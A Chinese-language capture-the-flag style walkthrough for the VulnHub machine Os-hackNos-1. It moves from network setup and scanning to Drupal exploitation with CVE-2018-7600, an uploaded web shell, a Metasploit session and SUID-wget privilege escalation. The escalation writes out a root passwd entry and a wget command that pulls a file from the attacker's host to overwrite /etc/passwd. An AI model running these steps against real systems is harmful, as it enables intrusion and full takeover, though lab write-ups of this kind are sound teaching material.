> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/qs2HPg9Nurn3RvBKioXSCA)

vulnhub 靶机 Os-hackNos-1
=======================

一. 靶机介绍
-------

Difficulty : Easy to Intermediate

Flag : 2 Flag first user And second root

Learning : exploit | Web Application | Enumeration | Privilege Escalation

详细链接以及下载链接:

hackNos: Os-hackNos ~ VulnHub[1]

二. 靶机搭建
-------

下载完镜像文件后使用 vm 打开即可, 这里主要讲 IP 分配不到的问题（否则后续无法做下去）。

### 1. 解决 IP 问题

开机按住 shift 键即可 进入下面界面

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIrHuwaqyG1N8XSNsoNkWKrmjK23WOnzk9tO0QaYVf4yUtIJKfMHicEsA/640?wx_fmt=png)

接着按住 键盘上的 E 键 进入下图

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIPiaLCnFwSDEzLUq5xbAUOdLe2zQ1JiaAc4c3v0L3FFFH3z6j6NbMnaoQ/640?wx_fmt=png)

往下查找 找到 Linux 开头 ro 结尾的字段

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIZ1dC3CtWe2bg5PGUXexK6nKvu9NpskloprCT0n0oCVHsVLbD6FGesQ/640?wx_fmt=png)

修改 ro 字段 为 rw signie init=/bin/bash

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIsoraA9V3o4UkIhjqS2qibzDic69B63FQSFHDHo4ficnDMu18LPy1dsn4A/640?wx_fmt=png)

修改完后按住 Ctrl+X 进入下图界面

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIXxOpW2yboHKXU0wlicBnOTjuFA950eIymibRxzN65SRmMNFVyPYpIFibA/640?wx_fmt=png)

查看当前虚拟机中的网卡名字 ip a 命令

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIt9CxtcgPCxRH2IeonQbZdSpYUdU5wkcpicXCUKenibzcdKRwa6Bv9Ndw/640?wx_fmt=png)

可以看到该靶场的网卡是 ens33，lo 是本地环回网卡，不用管它，直接看 ens33

接着修改网卡配置文件 vim /etc/network/interfaces

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIbr1qoicGvuy6uEdyKLYTch0VAPAWHAjHpqXeb7jrPfhaJQglbwOicL0Q/640?wx_fmt=png)

可以看到该网卡与实际的不一样， 所以导致没有 ip，这就是根源所在，所以直接修改为前面看到的网卡名字（ens33）即可

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIIpYgfBGVdWMUBBIeTicOiaic00ribkeh0ZTicNzUmjYML4UOoQdYVRExHaA/640?wx_fmt=png)

重启网卡 /etc/init.d/networking restart  再看 ip

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIpxjhYAG10X1sWBtf01tlkwCbCMTbTOjEoZ4ZTTHHcFRedHs8ic7JuRA/640?wx_fmt=png)

已成功获取到 IP 地址 , 然后重启该主机就行了

一般来说，vulnhub 的靶场都要这样配置，否则直接扫该网段是扫不出该 vulnhub 的靶场的，因为都没 IP 地址，就别谈后面的主机发现了。

三. 靶场攻略
-------

### 1. 主机发现

```
nmap -sn 192.168.22.1/24
netdiscover -i eth0 -r 192.168.22.1/24   # -i 选择网卡
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhII8T0SSBANib24sZbPTL9GqJsMTwiaKM8G3YHIQKZOlS9cCR2ibEc3SsPQA/640?wx_fmt=png)

可以扫描到 vulnhub 的 IP 地址为：192.168.22.11

### 2. 端口探测

```
nmap -sS -p1-65535 192.168.22.11
masscan -p1-65536 192.168.22.11 --rate=10000
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIInibqicICsnxZxRJgqmBxBpdx3ozoHqUthlvdNf4ZdpovMea1WR8BzQUg/640?wx_fmt=png)

### 3. 漏洞探测

#### 3.1.ssh

22 端口是 ssh，所以先简单测试暴力破解

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIozlI2N7FnrjNPmRy2hrl4j8MibPGSTQa9CskzzMy7GqEzXIhwOibHCfA/640?wx_fmt=png)

尝试后没有用

#### 3.2.http

接着尝试访问 80 端口

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhII9qHKfBrk4NOu1CW7ibNkUL80SHjko7MbuibUzibnL7aDVKap5ibuEjfiaMw/640?wx_fmt=png)

可以发现是一个 apache 的主页面，没什么作用点，接着就进行相应的目录扫描

这里利用 dirsearch

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIW9UicWWmRDriaKEWCjR5KGtxlo4zR7Rv7holhQFIbQq8WPPveTmJpO9Q/640?wx_fmt=png)

可以找到到一个目录地址 /drupal 进行访问

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIicbNg5xsVmYwiaW9EttwXMsRsx5VDaJjE3KeFXlp6HZfKBnrdViaNULTg/640?wx_fmt=png)

接着就可以利用该 Drupal CMS 网上搜相应的漏洞进行尝试

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIvMyKNDyeCI71pkhfpELINVfPKatJKKM7bLNTez5a4ib6yIMicHtP5rug/640?wx_fmt=png)

最后通过测试 **drupa7-CVE-2018-7600.py**  可以使用。

下载地址：CVE-2018-7600/drupa7-CVE-2018-7600.py at master · pimps/CVE-2018-7600 · GitHub[2]

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIicguLAxvY2PXdv3erBc2q2M6OxicZPcdib7cLSTNul7v52UazyeeRwvVw/640?wx_fmt=png)

该漏洞是一个命令执行，所以可以上传一个 shell 文件（利用 wget 命令进行下载），我这里就直接上传大马文件

### 4. 漏洞利用

#### 4.1. 上传 shell 文件

#### ①开启一个 web 服务

我这里直接用 python 开启

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIwEmWOmxNGMD1NF2UDUW7Jia0XIMNKdqsgUAsicXKia1XuJgzEY4GYoPTw/640?wx_fmt=png)

大马文件与启动的位置保持一致，我这里放在了桌面上。

#### ②利用命令执行漏洞进行下载

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIVaEib2SOcCBeUgQaupfcrq84KNdCibxvcwJb4mGayNvibGzrLsJIYyqiaw/640?wx_fmt=png)

可以观察到已经成功下载了，接下来就直接访问大马文件

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIzpa3smCqvt93fUicoq7aKr9CyIdOWUsHyqAz6ian4545To9usvtG48XA/640?wx_fmt=png)

#### 4.2.MSF 联动

接下来就是与 MSF 联动，因为该题目是找 flag 两个，另一个是在 root 的，所以考核的是提取手法。

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhII6kTGicX1jfmG2JeJ5cEkKo9fFx0HEB2ez1PJ2oIndicJDJyANKDMsyBw/640?wx_fmt=png)

成功反弹到 MSF 上了

#### 4.3.SUID 提权

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIEjqiaPuibVkq8l9X57DyxTrDMAwxAHKyrovqwF4Yyp6JkXjczx79JNBw/640?wx_fmt=png)

权限还是最低的，所以可以尝试相关提权手法，这里我就先尝试最简单的 **SUID 提权**

```
find / -user root -perm -4000 -print 2>/dev/null
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIdr6o9ricTrfWdPmBuuiaKmKLziavU6WtaumtstrKFiaxMZyh1eJq8sIaFg/640?wx_fmt=png)

可以观察到一个 passwd，这里我就想到可以写入一个新用户并赋予 root 权限从而达到提权的目的

#### ①先利用 kali 生成密码

```
openssl passwd ‐1 ‐salt mrfan mrfan
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIibGqHbibY1w5EfxpKC3jykOwNasly9bWoUm4DodibPSYU0oOQEroRDcLQ/640?wx_fmt=png)

/etc/passwd 字段 **root** 权限形如：

```
用户名:密码:0:0:root:/root:/bin/bash
```

我添加的用户就是如下形式：

```
mrfan:$1$mrfan$KhquGq.uZRnCMui.KH.lb.:0:0:root:/root:/bin/bash
```

先输出当前 vulnhub 的密码（cat /etc/passwd）

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIImZF8bOulzP31ibn2xz3CmRF8vbBYQyBs1fSc1j68WxZPmickLnET1qibA/640?wx_fmt=png)

复制该字段信息并添加新用户字段 保存文本为 1.txt

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIGd11hbIgcicXubBy2McVXeS6LaEGFlbb4TxVibMz9W7BNCDBSoxj4icBw/640?wx_fmt=png)

同样的方法 利用 wget 进行覆盖原有密码

#### ②开启一个 web 服务

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIONU2PNOx6U6owiae3UevRADds4F4Ho8CibePXyUOzJdnOvNFbCuoBTLg/640?wx_fmt=png)

此时该桌面是有上面保存的 / etc/passwd 以及新加入用户的字段信息的 且该文件名是 1.txt 文本

#### ③利用命令执行进行下载 并覆盖

```
wget http://192.168.22.10:8888/1.txt -O /etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIDDN0OoFWqkyX0sLVNDGpWgkeLv9BJbLusNvibc3AsP4CuJgtPCsK1TQ/640?wx_fmt=png)

#### ④输出 / etc/passwd 观察是否添加成功

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIIIsO4w0LW9oftHyYQBu17lnTFhGfbvyib4wKMRVzPiabx9uX17ywDQDg/640?wx_fmt=png)

成功添加了该用户字段

#### ⑤直接上 vulnhub 进行验证

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFC4m8AS9cbMBGpQL9cibfhIIZ7q5o9fdHR94fva677fG1He5aicGSynWUBRJmsjk0wBznPkDzFDvQIg/640?wx_fmt=png)

成功提权到了 root，实验就结束了，剩下的就是找 flag 了，就没什么可操作的了。

### References

`[1]` hackNos: Os-hackNos ~ VulnHub: _https://www.vulnhub.com/entry/hacknos-os-hacknos,401/#description_  
`[2]` CVE-2018-7600/drupa7-CVE-2018-7600.py at master · pimps/CVE-2018-7600 · GitHub: _https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7600.py_